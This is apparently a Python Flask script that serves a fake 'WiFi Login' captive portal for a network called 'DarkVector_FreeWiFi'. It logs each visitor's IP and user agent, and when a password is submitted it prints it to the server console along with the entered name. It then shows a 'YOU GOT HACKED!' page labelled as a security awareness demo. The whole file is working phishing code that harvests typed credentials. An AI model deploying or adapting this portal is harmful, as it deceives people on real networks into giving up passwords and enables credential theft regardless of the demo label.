from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    print(f"\nPhone Scanned!")
    print(f"IP: {request.remote_addr}")
    print(f"Device: {request.headers.get('User-Agent')}")
    return '''<!DOCTYPE html>
<html>
<head>
<title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
.box{background:white;padding:30px;border-radius:12px;width:85%;max-width:380px;box-shadow:0 2px 10px rgba(0,0,0,0.2);text-align:center;}
.wifi-icon{font-size:50px;margin-bottom:10px;}
h2{color:#333;margin:0 0 5px 0;}
p{color:#666;font-size:14px;}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;}
button{width:100%;padding:13px;background:#0066cc;color:white;border:none;border-radius:8px;font-size:16px;margin-top:5px;}
.network{color:#0066cc;font-weight:bold;}
</style>
</head>
<body>
<div class="box">
<div class="wifi-icon">📶</div>
<h2>WiFi Login</h2>
<p>Connect to network</p>
<p class="network">DarkVector_FreeWiFi</p>
<form action="/hacked" method="POST">
<input type="text" name="device" placeholder="Your Name (optional)">
<input type="password" name="password" placeholder="WiFi Password" required>
<button type="submit">Connect</button>
</form>
<small style="color:#999">Secure Connection</small>
</div>
</body>
</html>'''

@app.route('/hacked', methods=['POST'])
def hacked():
    password = request.form.get('password')
    device = request.form.get('device', 'Unknown')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    print(f"\n💀 CAPTURED!")
    print(f"Name: {device}")
    print(f"WiFi Password: {password}")
    print(f"IP: {ip}")
    print(f"Device: {ua}")
    print(f"Time: {datetime.datetime.now()}")
    return f'''<!DOCTYPE html>
<html>
<head>
<title>Hacked</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:black;color:#00ff00;font-family:monospace;overflow:hidden;height:100vh;}}
canvas{{position:fixed;top:0;left:0;z-index:0;}}
.content{{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;padding:20px;}}
.skull{{font-size:60px;animation:bounce 0.5s infinite alternate;}}
.title{{font-size:28px;color:red;font-weight:bold;animation:glitch 0.3s infinite;margin:10px 0;text-shadow:2px 0 red,-2px 0 cyan;}}
.info{{background:rgba(0,255,0,0.1);border:1px solid #00ff00;border-radius:8px;padding:15px;margin:15px 0;width:90%;max-width:350px;}}
.info p{{margin:8px 0;font-size:14px;color:#00ff00;}}
.warning{{color:yellow;font-size:13px;animation:blink 1s infinite;}}
.emoji{{font-size:30px;animation:spin 2s infinite linear;display:inline-block;}}
@keyframes bounce{{from{{transform:translateY(0)}}to{{transform:translateY(-15px)}}}}
@keyframes glitch{{0%{{text-shadow:2px 0 red,-2px 0 cyan}}50%{{text-shadow:-2px 0 red,2px 0 cyan}}100%{{text-shadow:2px 0 red,-2px 0 cyan}}}}
@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:0}}}}
@keyframes spin{{from{{transform:rotate(0deg)}}to{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="content">
<div class="skull">💀😈💀</div>
<div class="title">YOU GOT HACKED!</div>
<span class="emoji">😈</span>
<div class="info">
<p>📱 Device IP: {ip}</p>
<p>🔑 Password: {password}</p>
<p>👤 Name: {device}</p>
<p>🕐 Time: {datetime.datetime.now().strftime("%H:%M:%S")}</p>
</div>
<p class="warning">⚠️ NEVER connect to unknown WiFi ⚠️</p>
<p style="color:#00ff00;font-size:12px;margin-top:10px">DarkVector Security Awareness Demo 😈</p>
</div>
<script>
const canvas = document.getElementById("matrix");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*😈💀";
const fontSize = 14;
const cols = canvas.width / fontSize;
const drops = Array(Math.floor(cols)).fill(1);
function draw() {{
  ctx.fillStyle = "rgba(0,0,0,0.05)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "#00ff00";
  ctx.font = fontSize + "px monospace";
  drops.forEach((y, i) => {{
    const char = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(char, i * fontSize, y * fontSize);
    if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }});
}}
setInterval(draw, 35);
</script>
</body>
</html>'''

app.run(host='0.0.0.0', port=8080)
